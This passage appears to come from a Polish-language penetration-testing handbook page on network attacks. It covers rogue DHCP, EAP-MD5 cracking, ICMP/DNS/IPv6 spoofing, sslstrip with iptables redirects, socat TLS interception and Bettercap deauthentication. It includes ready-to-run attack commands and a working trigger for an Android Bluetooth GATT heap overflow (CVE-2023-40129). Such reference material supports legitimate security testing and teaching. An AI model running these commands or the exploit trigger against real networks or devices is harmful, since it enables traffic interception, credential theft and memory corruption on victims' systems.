- **Fałszowanie adresu domyślnej bramy**: Dodaj `-S`, aby sfałszować adres IP domyślnej bramy.
- **Odpowiadaj na wszystkie żądania DHCP**: Dodaj `-R`, aby serwer odpowiadał na wszystkie żądania DHCP, ale pamiętaj, że jest to głośne i może zostać wykryte.

Dzięki prawidłowemu użyciu tych opcji można uruchomić fałszywy serwer DHCP, który skutecznie przechwyci ruch sieciowy.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Ataki EAP**

Here are some of the attack tactics that can be used against 802.1X implementations:

- Aktywne brute-force łamanie haseł za pomocą EAP
- Atakowanie serwera RADIUS przy użyciu nieprawidłowo sformatowanej zawartości EAP _\*\*_(exploits)
- Przechwytywanie komunikatów EAP i łamanie haseł offline (EAP-MD5 i PEAP)
- Wymuszanie uwierzytelniania EAP-MD5 w celu obejścia walidacji certyfikatów TLS
- Wstrzykiwanie złośliwego ruchu sieciowego podczas uwierzytelniania przy użyciu huba lub podobnego urządzenia

If the attacker if between the victim and the authentication server, he could try to degrade (if necessary) the authentication protocol to EAP-MD5 and capture the authentication attempt. Then, he could brute-force this using:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Ataki <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) to klasa protokołów sieciowych zaprojektowana w celu **utworzenia aktywnego redundantnego systemu routingu**. Dzięki FHRP fizyczne routery mogą być połączone w jedno logiczne urządzenie, co zwiększa odporność na awarie i pomaga rozłożyć obciążenie.

**Inżynierowie Cisco Systems opracowali dwa protokoły FHRP, GLBP i HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Znane są trzy wersje Routing Information Protocol (RIP): RIP, RIPv2 oraz RIPng. RIP i RIPv2 wysyłają datagramy do sąsiadów za pomocą UDP na porcie 520, natomiast RIPng rozsyła datagramy przez IPv6 multicast na UDP porcie 521. RIPv2 wprowadził wsparcie dla uwierzytelniania MD5. Z kolei RIPng nie ma natywnego uwierzytelniania — polega na opcjonalnych nagłówkach IPsec AH i ESP w IPv6.

- **RIP i RIPv2:** Komunikacja odbywa się za pomocą datagramów UDP na porcie 520.
- **RIPng:** Wykorzystuje UDP port 521 do rozsyłania datagramów przez multicast IPv6.

Zwróć uwagę, że RIPv2 obsługuje uwierzytelnianie MD5, podczas gdy RIPng nie zawiera natywnego uwierzytelniania i polega na nagłówkach IPsec AH i ESP w IPv6.

### Ataki EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** to dynamiczny protokół routingu. **Jest to protokół distance-vector.** Jeśli nie ma **uwierzytelniania** i skonfigurowanych pasywnych interfejsów, **intruz** może ingerować w routing EIGRP i powodować **zatruwanie tablic routingu**. Ponadto sieć EIGRP (czyli system autonomiczny) **jest płaska i nie ma segmentacji na żadne strefy**. Jeśli **atakujący wstrzyknie trasę**, jest bardzo prawdopodobne, że trasa ta **rozprzestrzeni się** po całym autonomicznym systemie EIGRP.

Aby zaatakować system EIGRP trzeba **nawiązać sąsiedztwo z legalnym routerem EIGRP**, co otwiera wiele możliwości, od podstawowego rozpoznania po różne wstrzyknięcia.

[**FRRouting**](https://frrouting.org/) pozwala zaimplementować **wirtualny router obsługujący BGP, OSPF, EIGRP, RIP i inne protokoły.** Wystarczy wdrożyć go na systemie atakującego i można podszyć się pod legalny router w domenie routingu.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) ma możliwości przechwytywania rozgłoszeń EIGRP (Enhanced Interior Gateway Routing Protocol). Umożliwia też wstrzykiwanie pakietów, co można wykorzystać do zmiany konfiguracji routingu.

### OSPF

W protokole Open Shortest Path First (OSPF) powszechnie stosuje się uwierzytelnianie MD5, aby zapewnić bezpieczną komunikację między routerami. Jednak ten mechanizm można złamać za pomocą narzędzi takich jak Loki i John the Ripper. Narzędzia te potrafią przechwycić i złamać hashe MD5, ujawniając klucz uwierzytelniający. Po uzyskaniu tego klucza można go użyć do wprowadzenia nowych informacji routingu. Parametry trasy konfiguruje się na karcie _Injection_, a skompromitowany klucz ustawia na karcie _Connection_.

### Inne ogólne narzędzia i źródła

- [**Above**](https://github.com/c4s73r/Above): Narzędzie do skanowania ruchu sieciowego i wykrywania podatności
- Możesz znaleźć więcej informacji o atakach na sieć [**tutaj**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Atakujący konfiguruje wszystkie parametry sieci (GW, IP, DNS) nowego członka sieci, wysyłając fałszywe odpowiedzi DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Check the [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect polega na wysyłaniu ICMP packet type 1 code 5, który wskazuje, że attacker jest najlepszą drogą dotarcia do danego IP. Gdy victim będzie chciał skontaktować się z tym IP, wyśle packet przez attacker.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Atakujący rozwiąże niektóre (lub wszystkie) domeny, o które prosi ofiara.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Skonfiguruj własny DNS za pomocą dnsmasq**
```bash
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts
sudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokalne bramy

Często istnieje wiele tras do systemów i sieci. Po zbudowaniu listy adresów MAC w sieci lokalnej użyj _gateway-finder.py_, aby zidentyfikować hosty, które obsługują przekazywanie IPv4.

<details>
<summary>Przykład użycia gateway-finder</summary>
```bash
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
</details>


### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

W przypadku lokalnego rozwiązywania nazw hostów, gdy zapytania DNS nie powiodą się, systemy Microsoft korzystają z **Link-Local Multicast Name Resolution (LLMNR)** oraz **NetBIOS Name Service (NBT-NS)**. Podobnie implementacje **Apple Bonjour** i **Linux zero-configuration** używają **Multicast DNS (mDNS)** do wykrywania urządzeń w sieci. Ze względu na brak uwierzytelniania tych protokołów oraz ich działanie przez UDP z użyciem rozgłaszania, mogą być one wykorzystywane przez atakujących do przekierowywania użytkowników do złośliwych usług.

Możesz podszyć się pod usługi wyszukiwane przez hosty, używając Responder do wysyłania fałszywych odpowiedzi.\
Przeczytaj tu więcej informacji o [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Przeglądarki często korzystają z protokołu **Web Proxy Auto-Discovery (WPAD)**, aby automatycznie pobrać ustawienia proxy. Polega to na pobieraniu konfiguracji z serwera, zwykle z URL-a takiego jak "http://wpad.example.org/wpad.dat". Odkrycie takiego serwera przez klienty może następować różnymi mechanizmami:

- Przez **DHCP**, gdzie odkrycie ułatwia użycie specjalnego wpisu o kodzie 252.
- Przez **DNS**, co polega na wyszukiwaniu nazwy hosta oznaczonej jako _wpad_ w domenie lokalnej.
- Przez **Microsoft LLMNR i NBT-NS**, które są mechanizmami zapasowymi używanymi, gdy zapytania DNS nie powiodą się.

Narzędzie Responder wykorzystuje ten protokół, działając jako złośliwy serwer WPAD. Używa DHCP, DNS, LLMNR i NBT-NS, aby wprowadzić klientów w błąd i skłonić ich do połączenia. Aby zgłębić, jak usługi mogą być podszywane przy użyciu Responder [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Możesz zaoferować różne usługi w sieci, aby skłonić użytkownika do podania **poświadczeń w postaci jawnego tekstu**. **Więcej informacji o tym ataku w** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

IPv6 Neighbor Spoofing

This attack is very similar to ARP Spoofing but in the IPv6 world. You can get the victim think that the IPv6 of the GW has the MAC of the attacker.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Niektóre OS konfigurują domyślnie gateway na podstawie pakietów RA wysyłanych w sieci. Aby zadeklarować atakującego jako IPv6 router możesz użyć:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Domyślnie niektóre systemy operacyjne próbują skonfigurować DNS na podstawie pakietu DHCPv6 w sieci. Wówczas atakujący może wysłać pakiet DHCPv6, aby ustawić siebie jako serwer DNS. DHCP także przydziela ofierze adres IPv6.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fałszywa strona i JS code injection)

## Ataki internetowe

### sslStrip

Zasadniczo ten atak polega na tym, że jeśli **user** próbuje **access** stronę **HTTP**, która **redirecting** do wersji **HTTPS**, **sslStrip** będzie **maintain** a **HTTP connection with** the **client and** a **HTTPS connection with** the **server**, dzięki czemu będzie w stanie **sniff** połączenie w **plain text**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy do omijania HSTS

The **difference** between **sslStrip+ and dns2proxy** against **sslStrip** is that they will **redirect** for example _**www.facebook.com**_ **to** _**wwww.facebook.com**_ (note the **extra** "**w**") and will set the **address of this domain as the attacker IP**. This way, the **client** will **connect** to _**wwww.facebook.com**_ **(the attacker)** but behind the scenes **sslstrip+** will **maintain** the **real connection** via https with **www.facebook.com**.

The **goal** of this technique is to **avoid HSTS** because _**wwww**.facebook.com_ **won't** be saved in the **cache** of the browser, so the browser will be tricked to perform **facebook authentication in HTTP**.\
Note that in order to perform this attack the victim has to try to access initially to [http://www.faceook.com](http://www.faceook.com) and not https. This can be done modifying the links inside an http page.

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**Różnica między sslStrip+ i dns2proxy a sslStrip polega na tym, że będą przekierowywać na przykład _**www.facebook.com**_ na _**wwww.facebook.com**_ (zauważ **dodatkowe** "**w**") i ustawią **adres tej domeny jako IP atakującego**. W ten sposób **klient** połączy się z _**wwww.facebook.com**_ **(atakującym)**, ale w tle **sslstrip+** będzie **utrzymywać** **prawdziwe połączenie** przez https z **www.facebook.com**.**

**Celem** tej techniki jest **ominięcie HSTS**, ponieważ _**wwww**.facebook.com_ **nie zostanie** zapisany w **pamięci podręcznej** przeglądarki, więc przeglądarka zostanie oszukana, by przeprowadzić **uwierzytelnianie facebooka przez HTTP**.\
Zauważ, że aby przeprowadzić ten atak, ofiara musi najpierw próbować dostać się na [http://www.faceook.com](http://www.faceook.com), a nie na https. Można to zrobić, modyfikując linki na stronie HTTP.

**sslStrip or sslStrip+ doesn't work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP nasłuchiwanie na porcie
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL nasłuch na porcie

#### Wygeneruj klucze i certyfikat samopodpisany
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Nasłuch przy użyciu certyfikatu
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Nasłuchuj przy użyciu certyfikatu i przekieruj do hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Czasami, jeśli klient sprawdza, czy CA jest prawidłowy, możesz **serwować certyfikat innej nazwy hosta podpisany przez CA**.\
Innym ciekawym testem jest serwowanie c**ertyfikatu żądanej nazwy hosta, ale self-signed**.

Inne rzeczy do przetestowania to próba podpisania certyfikatu ważnym certyfikatem, który nie jest prawidłowym CA. Albo użycie prawidłowego klucza publicznego, wymuszenie użycia algorytmu takiego jak diffie hellman (takiego, który nie wymaga odszyfrowania czegokolwiek prawdziwym kluczem prywatnym) i gdy klient zażąda próby prawdziwego klucza prywatnego (np. hasha) wysłanie fałszywej próby z oczekiwaniem, że klient tego nie sprawdzi.

## Bettercap

<details>
<summary>Typowe polecenia Bettercap</summary>
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
</details>


### Notatki o aktywnym wykrywaniu

Należy pamiętać, że gdy pakiet UDP zostanie wysłany do urządzenia, które nie ma żądanego portu, zostanie wysłany komunikat ICMP (Port Unreachable).

### **ARP — odkrywanie**

Pakiety ARP służą do wykrywania, które adresy IP są używane w sieci. PC musi wysłać żądanie dla każdego możliwego adresu IP i odpowiadają tylko te, które są używane.

### **mDNS (multicast DNS)**

Bettercap wysyła zapytanie MDNS (co X ms) dotyczące **\_services\_.dns-sd.\_udp.local**. Maszyna, która otrzyma ten pakiet, zwykle odpowiada na to zapytanie. Następnie wyszukuje tylko maszyny odpowiadające na "services".

**Narzędzia**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap rozsyła pakiety na port 137/UDP, pytając o nazwę "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap rozsyła pakiety SSDP, wyszukując wszelkiego rodzaju usługi (UDP port 1900).

### **WSD (Web Service Discovery)**

Bettercap rozsyła pakiety WSD, wyszukując usługi (UDP port 3702).


## Ataki Bluetooth (L2CAP/ATT/GATT)

- Android Fluoride udostępnia usługi poprzez L2CAP PSMs (np. SDP 0x0001, RFCOMM 0x0003, BNEP 0x000F, AVCTP 0x0017/0x001B, AVDTP 0x0019, ATT/GATT 0x001F). Usługi rejestrują się poprzez:
```c
uint16_t L2CA_Register2(uint16_t psm, const tL2CAP_APPL_INFO& p_cb_info,
bool enable_snoop, tL2CAP_ERTM_INFO* p_ertm_info,
uint16_t my_mtu, uint16_t required_remote_mtu,
uint16_t sec_level);
```
- BlueBlue framework umożliwia Scapy-based L2CAP/ATT crafting (zbudowany na BlueBorne l2cap_infra). Przykład:
```python
acl  = ACLConnection(src_bdaddr, dst_bdaddr, auth_mode='justworks')
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=672)
gatt.send_frag(p8(GATT_READ)+p16(1234))
print(gatt.recv())
```
- CVE-2023-40129 (Fluoride GATT): integer underflow in Read Multiple Variable response builder może spowodować ~64KB heap overflow, gdy MTU truncates a variable-length element, ale pole długości +2 nie jest brane pod uwagę.

<details>
<summary>Przyczyna (GATT Read Multiple Variable)</summary>
```c
static void build_read_multi_rsp(tGATT_SR_CMD* p_cmd, uint16_t mtu) {
uint16_t ii, total_len, len; uint8_t* p; bool is_overflow=false;
len = sizeof(BT_HDR) + L2CAP_MIN_OFFSET + mtu;
BT_HDR* p_buf = (BT_HDR*)osi_calloc(len); p_buf->offset=L2CAP_MIN_OFFSET;
p = (uint8_t*)(p_buf + 1) + p_buf->offset; *p++ = GATT_RSP_READ_MULTI_VAR;
p_buf->len=1;
for (ii=0; ii<p_cmd->multi_req.num_handles; ii++) {
tGATTS_RSP* p_rsp = ...; // dequeued
if (p_rsp) {
total_len = (p_buf->len + p_rsp->attr_value.len);
if (p_cmd->multi_req.variable_len) total_len += 2;
if (total_len > mtu) {
len = p_rsp->attr_value.len - (total_len - mtu); // BUG: ignores +2
is_overflow = true;
} else { len = p_rsp->attr_value.len; }
if (p_cmd->multi_req.variable_len) { UINT16_TO_STREAM(p, len); p_buf->len += 2; }
memcpy(p, p_rsp->attr_value.value, len); // heap overflow
if (!is_overflow) p += len; p_buf->len += len; if (is_overflow) break;
}
}
}
```
- Na wpisach o zmiennej długości, the overflow path odejmuje tylko (total_len - mtu), ignorując pole długości +2, więc len underflows (np. 0xFFFE) i memcpy zapisuje ~64KB poza koniec bufora.
</details>

- Minimalny nieuwierzytelniony trigger (małe MTU wymusza underflow na 4. atrybucie):
```python
# GATT_REQ_READ_MULTI_VAR (0x20), MTU=55
acl  = ACLConnection(interface, bdaddr)
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=55)
pkt  = b'\x20'  # opcode
pkt += p16(9); pkt += p16(9); pkt += p16(9); pkt += p16(9)
gatt.send(pkt)
# On 4th insert: p_buf->len=55 (1 + 3*(16+2)), total_len=73 -> len=16-(73-55)=-2 -> ~64KB overwrite
```
### Telekomunikacja / Mobile-Core (GTP) Eksploatacja


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Źródła

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. Autorzy: Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Paint it blue: Attacking the bluetooth stack (Synacktiv)](https://www.synacktiv.com/en/publications/paint-it-blue-attacking-the-bluetooth-stack)
- [BlueBorne L2CAP testing infra (l2cap_infra)](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)



{{#include ../../banners/hacktricks-training.md}}
